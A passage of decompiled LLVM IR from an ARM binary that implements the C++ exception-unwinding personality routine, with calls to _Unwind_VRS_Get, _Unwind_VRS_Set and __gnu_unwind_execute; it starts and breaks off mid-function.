  %v1_22074 = phi i32 [ %v1_2207495, %dec_label_pc_22064.preheader ], [ %v2_2210c, %dec_label_pc_22108 ]
  %v1_22088 = phi i32 [ %v1_2207092, %dec_label_pc_22064.preheader ], [ %v1_22108, %dec_label_pc_22108 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_22068, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_22064
  %v2_2206c = add i32 %v1_22088, 4
  %v3_2206c = inttoptr i32 %v2_2206c to i32*
  %v4_2206c = load i32, i32* %v3_2206c, align 4
  store i32 %v4_2206c, i32* @r5, align 4
  store i32 %v1_22074, i32* @r6, align 4
  %v0_22078109 = load i32, i32* @r8, align 4
  %v1_22078110 = add i32 %v0_22078109, 72
  %v2_22078111 = inttoptr i32 %v1_22078110 to i32*
  %v3_22078112 = load i32, i32* %v2_22078111, align 4
  store i32 %v3_22078112, i32* @lr, align 4
  %v2_22084 = add i32 %v1_22088, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_22064
  %v2_22070 = add i32 %v1_22088, 2
  %v3_22070 = inttoptr i32 %v2_22070 to i16*
  %v4_22070 = load i16, i16* %v3_22070, align 2
  %v5_22070 = zext i16 %v4_22070 to i32
  store i32 %v5_22070, i32* @r5, align 4
  %v0_22078 = load i32, i32* @r8, align 4
  %v1_22078 = add i32 %v0_22078, 72
  %v2_22078 = inttoptr i32 %v1_22078 to i32*
  %v3_22078 = load i32, i32* %v2_22078, align 4
  store i32 %v3_22078, i32* @lr, align 4
  %v2_22080 = inttoptr i32 %v1_22088 to i16*
  %v3_22080 = load i16, i16* %v2_22080, align 2
  %v4_22080 = zext i16 %v3_22080 to i32
  store i32 %v4_22080, i32* @r6, align 4
  %v2_22088 = add i32 %v1_22088, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_22088, %.thread16 ], [ %v2_22084, %bb151 ]
  %v3_22078115 = phi i32 [ %v3_22078, %.thread16 ], [ %v3_22078112, %bb151 ]
  %v0_22090113 = phi i32 [ %v5_22070, %.thread16 ], [ %v4_2206c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_22090 = and i32 %v0_22090113, -2
  %v2_22094 = add i32 %v1_22090, %v3_22078115
  store i32 %v2_22094, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_220a4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_220a4, i32* %r0.global-to-local, align 4
  %v5_220b0 = call i32 @_Unwind_VRS_Get(i32 %v0_220a4, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_220b0, i32* %r0.global-to-local, align 4
  %v3_220b4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_220b4, i32* %r2.global-to-local, align 4
  %v0_220b8 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_220b8, %v3_220b4
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_220c4

._crit_edge:                                      ; preds = %bb152
  %v0_220dc.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_220c4:                               ; preds = %bb152
  %v0_220c4 = load i32, i32* @r6, align 4
  %v1_220c4 = and i32 %v0_220c4, -2
  %v2_220c8 = add i32 %v1_220c4, %v0_220b8
  %v3_220cc = icmp ult i32 %v3_220b4, %v2_220c8
  br i1 %v3_220cc, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_220c4
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_220c4
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_220dc = phi i32 [ %v0_220dc.pre, %._crit_edge ], [ %v0_220c4, %bb153 ], [ %v0_220c4, %.thread20 ]
  %v0_22284 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_220d8 = load i32, i32* @r5, align 4
  %v1_220dc = urem i32 %v0_220dc, 2
  %v1_220d8 = mul i32 %v0_220d8, 2
  %v3_220e0 = and i32 %v1_220d8, 2
  %v4_220e0 = or i32 %v3_220e0, %v1_220dc
  store i32 %v4_220e0, i32* %r2.global-to-local, align 4
  %v7_220e4 = icmp eq i32 %v4_220e0, 1
  br i1 %v7_220e4, label %dec_label_pc_22278, label %dec_label_pc_220ec

dec_label_pc_220ec:                               ; preds = %bb154
  %v2_220e4 = icmp eq i32 %v4_220e0, 0
  br i1 %v2_220e4, label %dec_label_pc_220f0, label %dec_label_pc_221a0

dec_label_pc_220f0:                               ; preds = %dec_label_pc_220ec
  store i32 %v1_21ff8, i32* %r2.global-to-local, align 4
  br i1 %v2_220f4, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_220f0
  %v0_22108119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_22108

bb155:                                            ; preds = %dec_label_pc_220f0
  %v2_22100 = icmp eq i32 %v0_22284, 0
  %v0_22108 = load i32, i32* @r7, align 4
  br i1 %v2_22100, label %dec_label_pc_22108, label %dec_label_pc_22480

dec_label_pc_22108:                               ; preds = %.thread, %bb155
  %v0_22108120 = phi i32 [ %v0_22108119, %.thread ], [ %v0_22108, %bb155 ]
  %v1_22108 = add i32 %v0_22108120, 4
  %v1_2210c = inttoptr i32 %v1_22108 to i32*
  %v2_2210c = load i32, i32* %v1_2210c, align 4
  %v2_22110 = icmp eq i32 %v2_2210c, 0
  br i1 %v2_22110, label %dec_label_pc_22118, label %dec_label_pc_22064

dec_label_pc_22118:                               ; preds = %dec_label_pc_2232c, %dec_label_pc_222f0, %dec_label_pc_22108, %dec_label_pc_22058.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_22058.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_22108 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_222f0 ], [ %stack_var_-76.4, %dec_label_pc_2232c ]
  %v0_22118 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22118, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_9* %uws_-60 to %anon_struct_18*
  %v4_22120 = call i32 @__gnu_unwind_execute(i32 %v0_22118, %anon_struct_18* %tmp156)
  store i32 %v4_22120, i32* %r0.global-to-local, align 4
  store i32 %v4_22120, i32* %r5.global-to-local, align 4
  %v2_22124 = icmp eq i32 %v4_22120, 0
  br i1 %v2_22124, label %dec_label_pc_2212c, label %dec_label_pc_221a8

dec_label_pc_2212c:                               ; preds = %dec_label_pc_22118
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_22130 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_22130, label %bb157, label %dec_label_pc_2213c

bb157:                                            ; preds = %dec_label_pc_2212c
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_2213c:                               ; preds = %dec_label_pc_2212c
  %v2_2213c = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_2213c, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_2214c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_2214c, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_22154 = call i32 @_Unwind_VRS_Get(i32 %v0_2214c, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_22158 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_2214c, i32* %r0.global-to-local, align 4
  %v5_2216c = call i32 @_Unwind_VRS_Set(i32 %v0_2214c, i32 %v0_22158, i32 14, i32 %v0_22158, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_2216c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r2.global-to-local, align 4
  %v4_22178 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 32) to i32*), align 4
  %v0_2217c = load i32, i32* %r5.global-to-local, align 4
  %v0_22180 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22180, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_22178, i32* %stack_var_-48, align 4
  %v5_22194 = call i32 @_Unwind_VRS_Set(i32 %v0_22180, i32 %v0_2217c, i32 15, i32 %v0_2217c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_221a0:                               ; preds = %dec_label_pc_220ec
  %v7_221a0 = icmp eq i32 %v4_220e0, 2
  br i1 %v7_221a0, label %dec_label_pc_221b8, label %dec_label_pc_221a8

dec_label_pc_221a8:                               ; preds = %dec_label_pc_221a0, %dec_label_pc_2228c, %dec_label_pc_22118, %dec_label_pc_22480
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_221ac:                               ; preds = %bb157, %dec_label_pc_224b8, %dec_label_pc_22448, %bb166, %dec_label_pc_2213c, %dec_label_pc_221a8
  %v1_221b4 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_224b8 ], [ %v1_221b4.pre, %dec_label_pc_22448 ], [ 7, %bb166 ], [ 7, %dec_label_pc_2213c ], [ 9, %dec_label_pc_221a8 ]
  store i32 %v3_21fc8, i32* %r4.global-to-local, align 4
  store i32 %v6_21fc8, i32* %r5.global-to-local, align 4
  ret i32 %v1_221b4

dec_label_pc_221b8:                               ; preds = %dec_label_pc_221a0
  store i32 %v1_21ff8, i32* %r2.global-to-local, align 4
  %v0_221bc = load i32, i32* @r7, align 4
  %v1_221bc = inttoptr i32 %v0_221bc to i32*
  %v2_221bc = load i32, i32* %v1_221bc, align 4
  %tmp206 = bitcast i32 %v2_221bc to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_221c4 = bitcast float %tmp207 to i32
  store i32 %v1_221c4, i32* @sl, align 4
  br i1 %v2_220f4, label %dec_label_pc_221cc, label %dec_label_pc_22338

dec_label_pc_221cc:                               ; preds = %dec_label_pc_221b8
  %v2_221cc = icmp eq i32 %v0_22284, 0
  br i1 %v2_221cc, label %dec_label_pc_22320, label %dec_label_pc_221d4

dec_label_pc_221d4:                               ; preds = %dec_label_pc_221cc
  %v2_221d8 = icmp eq i32 %v1_221c4, 0
  br i1 %v2_221d8, label %dec_label_pc_221e4.thread, label %bb159

dec_label_pc_221e4.thread:                        ; preds = %dec_label_pc_221d4
  br label %dec_label_pc_22448

bb159:                                            ; preds = %dec_label_pc_221d4
  br i1 %v3_221dc, label %dec_label_pc_221ec, label %dec_label_pc_22320

dec_label_pc_221ec:                               ; preds = %bb159
  %v1_221ec = add i32 %v0_221bc, 4
  store i32 %v1_221ec, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_221fc = load i32, i32* @r8, align 4
  %v1_221fc = add i32 %v0_221fc, 88
  store i32 %v1_221fc, i32* %sb.global-to-local, align 4
  store i32 %v1_221ec, i32* @r4, align 4
  br label %dec_label_pc_22220

dec_label_pc_22210:                               ; preds = %bb161
  %v1_22210 = add i32 %v0_22210, 1
  store i32 %v1_22210, i32* @r5, align 4
  %v1_22214 = load i32, i32* @sl, align 4
  %v9_22214 = icmp eq i32 %v1_22210, %v1_22214
  %v0_22218 = load i32, i32* @r4, align 4
  %v1_22218 = add i32 %v0_22218, 4
  store i32 %v1_22218, i32* @r4, align 4
  br i1 %v9_22214, label %dec_label_pc_22448, label %dec_label_pc_22210.dec_label_pc_22220_crit_edge

dec_label_pc_22210.dec_label_pc_22220_crit_edge:  ; preds = %dec_label_pc_22210
  %v0_2222c.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_22220

dec_label_pc_22220:                               ; preds = %dec_label_pc_22210.dec_label_pc_22220_crit_edge, %dec_label_pc_221ec
  %v0_2222c = phi i32 [ %v0_2222c.pre, %dec_label_pc_22210.dec_label_pc_22220_crit_edge ], [ %v1_221fc, %dec_label_pc_221ec ]
  %v1_22230 = phi i32 [ %v1_22218, %dec_label_pc_22210.dec_label_pc_22220_crit_edge ], [ %v1_221ec, %dec_label_pc_221ec ]
  %v1_22220 = inttoptr i32 %v1_22230 to i32*
  %v2_22220 = load i32, i32* %v1_22220, align 4
  %v2_22224 = icmp eq i32 %v2_22220, 0
  store i32 %v0_2222c, i32* %forced_unwind_-44, align 4
  br i1 %v2_22224, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_22220
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_22220, %bb160
  %v0_22234 = load i32, i32* @r8, align 4
  store i32 %v0_22234, i32* %r0.global-to-local, align 4
  store i32 %v2_222c0, i32* %r2.global-to-local, align 4
  %v4_22244 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 100) to i32*), align 4
  store i32 139856, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_22244)
  %v0_22250 = load i32, i32* %r0.global-to-local, align 4
  %v2_22250 = icmp eq i32 %v0_22250, 0
  %v0_22210 = load i32, i32* @r5, align 4
  br i1 %v2_22250, label %dec_label_pc_22210, label %dec_label_pc_22258

dec_label_pc_22258:                               ; preds = %bb161
  %v1_22258 = load i32, i32* @sl, align 4
  %v9_22258 = icmp eq i32 %v0_22210, %v1_22258
  br i1 %v9_22258, label %dec_label_pc_22448, label %dec_label_pc_22260

dec_label_pc_22260:                               ; preds = %dec_label_pc_22258
  %v0_22260 = load i32, i32* @r7, align 4
  %v1_22260 = inttoptr i32 %v0_22260 to i32*
  %v2_22260 = load i32, i32* %v1_22260, align 4
  %v1_22264 = icmp slt i32 %v2_22260, 0
  %v0_2226c.pre = load i32, i32* @r6, align 4
  br i1 %v1_22264, label %dec_label_pc_2226c, label %dec_label_pc_2232c

dec_label_pc_2226c:                               ; preds = %dec_label_pc_22260, %dec_label_pc_22324
  %v0_2226c = phi i32 [ %storemerge, %dec_label_pc_22324 ], [ %v0_2226c.pre, %dec_label_pc_22260 ]
  store i32 %v0_2226c, i32* %r0.global-to-local, align 4
  %v1_22270 = add i32 %v0_2226c, 4
  store i32 %v1_22270, i32* @r6, align 4
  br label %dec_label_pc_2232c

dec_label_pc_22278:                               ; preds = %bb154
  store i32 %v1_21ff8, i32* %r2.global-to-local, align 4
  br i1 %v2_220f4, label %dec_label_pc_22284, label %dec_label_pc_22370

dec_label_pc_22284:                               ; preds = %dec_label_pc_22278
  %v2_22284 = icmp eq i32 %v0_22284, 0
  br i1 %v2_22284, label %dec_label_pc_222f0, label %dec_label_pc_2228c

dec_label_pc_2228c:                               ; preds = %dec_label_pc_22284
  %v0_2228c = load i32, i32* @r7, align 4
  %v1_2228c = add i32 %v0_2228c, 4
  %v2_2228c = inttoptr i32 %v1_2228c to i32*
  %v3_2228c = load i32, i32* %v2_2228c, align 4
  %v7_22290 = icmp eq i32 %v3_2228c, -2
  store i32 %v1_2228c, i32* %r2.global-to-local, align 4
  br i1 %v7_22290, label %dec_label_pc_221a8, label %dec_label_pc_2229c

dec_label_pc_2229c:                               ; preds = %dec_label_pc_2228c
  %v0_2229c = load i32, i32* @r8, align 4
  %v1_2229c = add i32 %v0_2229c, 88
  %v7_222a0 = icmp eq i32 %v3_2228c, -1
  store i32 %v1_2229c, i32* %forced_unwind_-44, align 4
  br i1 %v7_222a0, label %dec_label_pc_222e4, label %dec_label_pc_222ac

dec_label_pc_222ac:                               ; preds = %dec_label_pc_2229c
  %v2_222b0 = icmp eq i32 %v3_2228c, 0
  br i1 %v2_222b0, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_222ac
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_222ac, %bb162
  store i32 %v0_2229c, i32* %r0.global-to-local, align 4
  store i32 %v2_222c0, i32* %r2.global-to-local, align 4
  %v4_222cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 100) to i32*), align 4
  store i32 139992, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_222cc)
  %v0_222d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_222d8 = icmp eq i32 %v0_222d8, 0
  br i1 %v2_222d8, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_222e4.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_222e4

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_222f0

dec_label_pc_222e4:                               ; preds = %.thread25, %dec_label_pc_2229c
  %v3_222e4 = phi i32 [ %v3_222e4.pr, %.thread25 ], [ %v1_2229c, %dec_label_pc_2229c ]
  %v2_222e8 = icmp eq i32 %v3_222e4, 0
  br i1 %v2_222e8, label %dec_label_pc_222f0, label %dec_label_pc_22448

dec_label_pc_222f0:                               ; preds = %bb164, %dec_label_pc_2239c, %dec_label_pc_22370, %dec_label_pc_222e4, %dec_label_pc_22284
  %v0_222f0 = load i32, i32* @r7, align 4
  %v1_222f0 = add i32 %v0_222f0, 8
  %v1_22058 = inttoptr i32 %v1_222f0 to i32*
  %v2_22058 = load i32, i32* %v1_22058, align 4
  %v2_2205c = icmp eq i32 %v2_22058, 0
  br i1 %v2_2205c, label %dec_label_pc_22118, label %dec_label_pc_22064.preheader

dec_label_pc_222f8:                               ; preds = %entry
  %v3_222f8 = udiv i32 %v2_21fec, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_22308 = mul nuw nsw i32 %v3_222f8, 4
  %v3_2230c = mul i32 %v2_21fec, 65536
  %v2_22310 = add i32 %v6_22308, %v4_21fec
  store i32 %v3_2230c, i32* %v4_2200c, align 8
  br label %dec_label_pc_22034

dec_label_pc_22320:                               ; preds = %bb159, %dec_label_pc_221cc
  %v1_22320 = add i32 %v0_221bc, 4
  br label %dec_label_pc_22324

dec_label_pc_22324:                               ; preds = %dec_label_pc_22364, %dec_label_pc_22320
  %v0_22324 = phi i32 [ %v2_22364, %dec_label_pc_22364 ], [ %v2_221bc, %dec_label_pc_22320 ]
  %storemerge = phi i32 [ %v4_22364, %dec_label_pc_22364 ], [ %v1_22320, %dec_label_pc_22320 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_22324 = icmp slt i32 %v0_22324, 0
  br i1 %v1_22324, label %dec_label_pc_2226c, label %dec_label_pc_2232c

dec_label_pc_2232c:                               ; preds = %dec_label_pc_22260, %dec_label_pc_22324, %dec_label_pc_22438, %dec_label_pc_2226c
  %v0_22330 = phi i32 [ %v1_22270, %dec_label_pc_2226c ], [ %storemerge, %dec_label_pc_22324 ], [ %v1_2243c, %dec_label_pc_22438 ], [ %v0_2226c.pre, %dec_label_pc_22260 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_2226c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_22324 ], [ %v1_22438, %dec_label_pc_22438 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_22260 ]
  %v0_2232c = load i32, i32* @sl, align 4
  %v3_2232c = mul i32 %v0_2232c, 4
  %v2_22330 = add i32 %v3_2232c, %v0_22330
  %v1_2205865 = inttoptr i32 %v2_22330 to i32*
  %v2_2205866 = load i32, i32* %v1_2205865, align 4
  %v2_2205c68 = icmp eq i32 %v2_2205866, 0
  br i1 %v2_2205c68, label %dec_label_pc_22118, label %dec_label_pc_22064.preheader.lr.ph

dec_label_pc_22338:                               ; preds = %dec_label_pc_221b8
  %v0_22348 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22348, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_22350 = load i32, i32* @r8, align 4
  %v1_22350 = add i32 %v0_22350, 32
  %v2_22350 = inttoptr i32 %v1_22350 to i32*
  %v3_22350 = load i32, i32* %v2_22350, align 4
  store i32 %v3_22350, i32* @r4, align 4
  %v5_22354 = call i32 @_Unwind_VRS_Get(i32 %v0_22348, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22354, i32* %r0.global-to-local, align 4
  %v3_22358 = load i32, i32* %stack_var_-48, align 4
  %v0_2235c = load i32, i32* @r4, align 4
  %v9_2235c = icmp eq i32 %v0_2235c, %v3_22358
  br i1 %v9_2235c, label %dec_label_pc_22404, label %dec_label_pc_22338.dec_label_pc_22364_crit_edge

dec_label_pc_22338.dec_label_pc_22364_crit_edge:  ; preds = %dec_label_pc_22338
  %v0_22364.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_22364

dec_label_pc_22364:                               ; preds = %dec_label_pc_22338.dec_label_pc_22364_crit_edge, %dec_label_pc_22404
  %v0_22364 = phi i32 [ %v0_22364.pre, %dec_label_pc_22338.dec_label_pc_22364_crit_edge ], [ %v1_22408, %dec_label_pc_22404 ]
  %v1_22364 = inttoptr i32 %v0_22364 to i32*
  %v2_22364 = load i32, i32* %v1_22364, align 4
  %v4_22364 = add i32 %v0_22364, 4
  store i32 %v4_22364, i32* @r7, align 4
  br label %dec_label_pc_22324

dec_label_pc_22370:                               ; preds = %dec_label_pc_22278
  %v0_22380 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22380, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_22388 = load i32, i32* @r8, align 4
  %v1_22388 = add i32 %v0_22388, 32
  %v2_22388 = inttoptr i32 %v1_22388 to i32*
  %v3_22388 = load i32, i32* %v2_22388, align 4
  store i32 %v3_22388, i32* @r4, align 4
  %v5_2238c = call i32 @_Unwind_VRS_Get(i32 %v0_22380, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_2238c, i32* %r0.global-to-local, align 4
  %v3_22390 = load i32, i32* %stack_var_-48, align 4
  %v0_22394 = load i32, i32* @r4, align 4
  %v9_22394 = icmp eq i32 %v0_22394, %v3_22390
  br i1 %v9_22394, label %dec_label_pc_2239c, label %dec_label_pc_222f0

dec_label_pc_2239c:                               ; preds = %dec_label_pc_22370
  %v0_2239c = load i32, i32* @r8, align 4
  %v1_2239c = add i32 %v0_2239c, 40
  %v2_2239c = inttoptr i32 %v1_2239c to i32*
  %v3_2239c = load i32, i32* %v2_2239c, align 4
  %v1_223a0 = load i32, i32* @r7, align 4
  %v9_223a0 = icmp eq i32 %v3_2239c, %v1_223a0
  br i1 %v9_223a0, label %dec_label_pc_223a8, label %dec_label_pc_222f0

dec_label_pc_223a8:                               ; preds = %dec_label_pc_2239c
  %v1_223a8 = inttoptr i32 %v3_2239c to i32*
  %v2_223a8 = load i32, i32* %v1_223a8, align 4
  %v1_223ac = and i32 %v2_223a8, 1073741824
  %v2_223ac = icmp eq i32 %v1_223ac, 0
  br i1 %v2_223ac, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_223a8
  %v2_223b0 = or i32 %v2_223a8, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_223a8
  %tmp208 = bitcast i32 %v2_223a8 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_223b4 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_223b8 = phi i32 [ %v2_224e8, %.thread28 ], [ %v2_224e8, %bb169 ], [ %v3_2239c, %bb165 ], [ %v3_2239c, %.thread26 ]
  %v0_223b8 = phi i32 [ %v2_224f8, %.thread28 ], [ %v2_224f4, %bb169 ], [ %v2_223b0, %bb165 ], [ %v2_223b4, %.thread26 ]
  %v2_223b8 = add i32 %v0_223b8, %v1_223b8
  store i32 %v2_223b8, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_223d0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_223d0, i32* %r0.global-to-local, align 4
  %v5_223d8 = call i32 @_Unwind_VRS_Set(i32 %v0_223d0, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_223d0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_223f0 = load i32, i32* @r8, align 4
  store i32 %v0_223f0, i32* %stack_var_-48, align 4
  %v5_223f8 = call i32 @_Unwind_VRS_Set(i32 %v0_223d0, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_22404:                               ; preds = %dec_label_pc_22338
  %v0_22404 = load i32, i32* @r8, align 4
  %v1_22404 = add i32 %v0_22404, 40
  %v2_22404 = inttoptr i32 %v1_22404 to i32*
  %v3_22404 = load i32, i32* %v2_22404, align 4
  %v1_22408 = load i32, i32* @r7, align 4
  %v9_22408 = icmp eq i32 %v3_22404, %v1_22408
  br i1 %v9_22408, label %dec_label_pc_22410, label %dec_label_pc_22364

dec_label_pc_22410:                               ; preds = %dec_label_pc_22404
  %v1_22414 = add i32 %v3_22404, 4
  store i32 %v1_22414, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_2241c = add i32 %v0_22404, 44
  %v3_2241c = inttoptr i32 %v2_2241c to i32*
  store i32 0, i32* %v3_2241c, align 4
  %v0_22420 = load i32, i32* %r2.global-to-local, align 4
  %v1_22420 = load i32, i32* @r8, align 4
  %v2_22420 = add i32 %v1_22420, 48
  %v3_22420 = inttoptr i32 %v2_22420 to i32*
  store i32 %v0_22420, i32* %v3_22420, align 4
  %v0_22424 = load i32, i32* @sl, align 4
  %v1_22424 = load i32, i32* @r8, align 4
  %v2_22424 = add i32 %v1_22424, 40
  %v3_22424 = inttoptr i32 %v2_22424 to i32*
  store i32 %v0_22424, i32* %v3_22424, align 4
  %v0_22428 = load i32, i32* %r0.global-to-local, align 4
  %v1_22428 = load i32, i32* @r8, align 4
  %v2_22428 = add i32 %v1_22428, 52
  %v3_22428 = inttoptr i32 %v2_22428 to i32*
  store i32 %v0_22428, i32* %v3_22428, align 4
  %v0_2242c = load i32, i32* @r7, align 4
  %v1_2242c = inttoptr i32 %v0_2242c to i32*
  %v2_2242c = load i32, i32* %v1_2242c, align 4
  %v1_22430 = icmp slt i32 %v2_2242c, 0
  br i1 %v1_22430, label %dec_label_pc_22438, label %dec_label_pc_224e4

dec_label_pc_22438:                               ; preds = %dec_label_pc_22410
  %v0_22438 = load i32, i32* %r2.global-to-local, align 4
  %v1_22438 = add i32 %v0_22438, -3
  store i32 %v1_22438, i32* %r2.global-to-local, align 4
  %v0_2243c = load i32, i32* %r0.global-to-local, align 4
  %v1_2243c = add i32 %v0_2243c, 4
  store i32 %v1_2243c, i32* @r6, align 4
  br label %dec_label_pc_2232c

dec_label_pc_22448:                               ; preds = %dec_label_pc_22258, %dec_label_pc_222e4, %dec_label_pc_22210, %dec_label_pc_221e4.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_22458 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22458, i32* %r0.global-to-local, align 4
  %v5_22460 = call i32 @_Unwind_VRS_Get(i32 %v0_22458, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_22464 = load i32, i32* @r7, align 4
  %v1_22464 = load i32, i32* @r8, align 4
  %v2_22464 = add i32 %v1_22464, 40
  %v3_22464 = inttoptr i32 %v2_22464 to i32*
  store i32 %v0_22464, i32* %v3_22464, align 4
  %v3_22468 = load i32, i32* %stack_var_-48, align 4
  %v3_2246c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_2246c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_22474 = load i32, i32* @r8, align 4
  %v2_22474 = add i32 %v1_22474, 32
  %v3_22474 = inttoptr i32 %v2_22474 to i32*
  store i32 %v3_22468, i32* %v3_22474, align 4
  %v0_22478 = load i32, i32* %r2.global-to-local, align 4
  %v1_22478 = load i32, i32* @r8, align 4
  %v2_22478 = add i32 %v1_22478, 36
  %v3_22478 = inttoptr i32 %v2_22478 to i32*
  store i32 %v0_22478, i32* %v3_22478, align 4
  %v1_221b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_221ac

dec_label_pc_22480:                               ; preds = %bb155
  %v1_22480 = inttoptr i32 %v0_22108 to i32*
  %v2_22480 = load i32, i32* %v1_22480, align 4
  %v1_22484 = add i32 %v0_22108, 4
  %v1_22488 = and i32 %v2_22480, 1073741824
  %v2_22488 = icmp eq i32 %v1_22488, 0
  %v2_2248c = or i32 %v2_22480, -2147483648
  %tmp210 = bitcast i32 %v2_22480 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_22490 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_22488, i32 %v2_22490, i32 %v2_2248c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_22494 = load i32, i32* @r8, align 4
  %v2_22494 = add i32 %v1_22494, 56
  %v3_22494 = inttoptr i32 %v2_22494 to i32*
  store i32 %v1_22484, i32* %v3_22494, align 4
  %v0_22498 = load i32, i32* @r8, align 4
  store i32 %v0_22498, i32* %r0.global-to-local, align 4
  %v4_224a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 28) to i32*), align 4
  store i32 140464, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_224a4)
  %v0_224b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_224b0 = icmp eq i32 %v0_224b0, 0
  br i1 %v2_224b0, label %dec_label_pc_221a8, label %dec_label_pc_224b8

dec_label_pc_224b8:                               ; preds = %dec_label_pc_22480
